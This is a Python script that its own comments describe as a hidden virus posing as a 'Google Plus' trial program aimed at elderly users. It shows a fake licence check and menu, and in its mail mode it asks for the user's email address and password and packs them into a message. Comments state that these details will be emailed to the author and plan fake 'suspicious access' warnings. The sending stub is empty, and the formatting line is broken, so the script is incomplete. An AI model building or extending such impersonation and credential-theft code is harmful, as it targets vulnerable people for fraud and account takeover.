#Hidden virus inside a program tailored for old people to download. (Google+)

import time
import os

clear = lambda: os.system("cls")
email = None
password = None
message = None

def frontend():
    #Works with the other functions, to create the program.

    global mode

    print('Welcome to Google Plus.')
    time.sleep(1)
    login()
    
    clear()

    print('DISCLAMER: This trial will only last for two weeks.')
    print('')
    print('')
    print('')
    print('(1)Google Chrome +')
    print('(2)Google Docs +')
    print('(3)Google Mail +')

    mode = input('Enter the number to the left of the mode you would like to use: ')

def backend():
    #To email the details to me.
    pass

def login():
    key = input('Enter the license key included in the email you were sent: ')

    if key != 'G+2021KeyA073bbw82':
        print('Access denied.')
        exit()
    else:
        print('Key confirmed.')
        print('Proceeding...')
        time.sleep(0.5)

#These three programs will each be infected, with a hidden way of activating the backend.

def google_chrome():
    #The worst thing I may do is a 'suspicious access' warning, to grab account details and email them to me.
    #This will require them to log into a Google + service, so it may not be as reliable as Google Mail +.

    global mode

    pass

def google_docs():
    #I am currently not planning to do anything with this, maybe just a storage overload.

    global mode

    pass

def google_mail():
    #The 'virus' in this program will send the email and password of this person's address to my email as soon as it is obtained.
    global email

    email = input('Enter your email address: ')
    password = input('Enter your password')

    clear()

    detail_grab()
    send_mail()
    print('Email sent!')
    input('Press enter to close this program')
    #Even if you were to somehow check, when the email is sent, nothing bad has actually happened until you continue.
    backend()

def send_mail():
    #sends the real email.
    reciever = input('Enter the email address you want to send to: ')
    body = input('Type the whole email here: ')

def detail_grab():
    #Formats the details to send as an email.
    global email
    global password
    global message

    message = (str('Email:Passowrd.     ', email, ':', password))


frontend()

if mode == '1':
    clear()
    google_chrome()

if mode == '2':
    clear()
    google_docs()

if mode == '3':
    clear()
    google_mail()
